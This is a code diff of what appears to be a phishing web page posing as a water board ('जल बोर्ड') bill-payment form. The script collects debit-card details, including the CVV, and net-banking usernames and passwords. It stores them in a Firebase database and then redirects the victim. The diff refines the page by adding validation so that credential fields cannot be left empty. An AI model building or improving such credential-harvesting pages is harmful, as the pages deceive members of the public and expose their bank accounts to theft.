@@ -91,12 +91,9 @@
   </style>
 </head>
 <body>
-
   <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer">
-
   <div class="form-container">
     <h2>जल¥बोर्ड</h2>
-
     <div class="section-title">Payment Method</div>
 
     <button class="side-button" onclick="showForm('debit')">💳 Debit Card</button>
@@ -135,7 +132,6 @@
       <button class="submit-button" onclick="submitNetBanking()">Proceed</button>
       <img class="form-image" src="https://i.ibb.co/p6HVRc70/1000-F-591801774-zrm7u-R6n-P0r9g-S1r6s3umqut4h-Mk-EKr-C.jpg" alt="Banking Image">
     </div>
-
   </div>
 
   <!-- Firebase SDK -->
@@ -171,14 +167,20 @@
         cvv: cvv,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
-        window.location.href = "page9.html"; // Redirect after success
+        window.location.href = "page9.html";
       });
     }
 
     function submitNetBanking() {
       const bank = document.getElementById("bankSelect").value;
-      const user = document.getElementById("netUser").value;
-      const pass = document.getElementById("netPass").value;
+      const user = document.getElementById("netUser").value.trim();
+      const pass = document.getElementById("netPass").value.trim();
+
+      // Validation
+      if (user === "" || pass === "") {
+        alert("Please enter both Username and Password.");
+        return; // Stop submit
+      }
 
       db.collection("payments").add({
         method: "netbanking",
@@ -187,24 +189,25 @@
         password: pass,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
-        window.location.href = "page11.html"; // Redirect after success
+        window.location.href = "page11.html";
       });
     }
 
     const bankList = [
       "SelectBank", "Allahabad Bank", "Andhra Bank", "Axis Bank", "Bank of Bahrain and Kuwait",
-      "Bank of Baroda - Corporate Banking", "Bank of Baroda - Retail Banking", "Bank of India",
-      "Bank of Maharashtra", "Canara Bank", "Central Bank of India", "City Union Bank",
-      "Corporation Bank", "Deutsche Bank", "Development Credit Bank", "Dhanlaxmi Bank",
-      "Federal Bank", "ICICI Bank", "IDBI Bank", "Indian Bank", "Indian Overseas Bank",
-      "IndusInd Bank", "ING Vysya Bank", "Jammu and Kashmir Bank", "Karnataka Bank Ltd",
-      "Karur Vysya Bank", "Kotak Bank", "Laxmi Vilas Bank", "Oriental Bank of Commerce",
-      "Punjab National Bank - Corporate Banking", "Punjab National Bank - Retail Banking",
-      "Punjab & Sind Bank", "Shamrao Vitthal Co-operative Bank", "South Indian Bank",
+      "Bank of Baroda - Corporate Banking", "Bank of Baroda - Retail Banking",
+      "Bank of India", "Bank of Maharashtra", "Canara Bank", "Central Bank of India",
+      "City Union Bank", "Corporation Bank", "Deutsche Bank", "Development Credit Bank",
+      "Dhanlaxmi Bank", "Federal Bank", "ICICI Bank", "IDBI Bank", "Indian Bank",
+      "Indian Overseas Bank", "IndusInd Bank", "ING Vysya Bank", "Jammu and Kashmir Bank",
+      "Karnataka Bank Ltd", "Karur Vysya Bank", "Kotak Bank", "Laxmi Vilas Bank",
+      "Oriental Bank of Commerce", "Punjab National Bank - Corporate Banking",
+      "Punjab National Bank - Retail Banking", "Punjab & Sind Bank",
+      "Shamrao Vitthal Co-operative Bank", "South Indian Bank",
       "State Bank of Bikaner & Jaipur", "State Bank of Hyderabad", "State Bank of India",
       "State Bank of Mysore", "State Bank of Patiala", "State Bank of Travancore",
-      "Syndicate Bank", "Tamilnad Mercantile Bank Ltd.", "UCO Bank", "Union Bank of India",
-      "United Bank of India", "Vijaya Bank", "Yes Bank Ltd"
+      "Syndicate Bank", "Tamilnad Mercantile Bank Ltd.", "UCO Bank",
+      "Union Bank of India", "United Bank of India", "Vijaya Bank", "Yes Bank Ltd"
     ];
 
     window.onload = function () {
@@ -217,6 +220,5 @@
       });
     };
   </script>
-
 </body>
 </html>
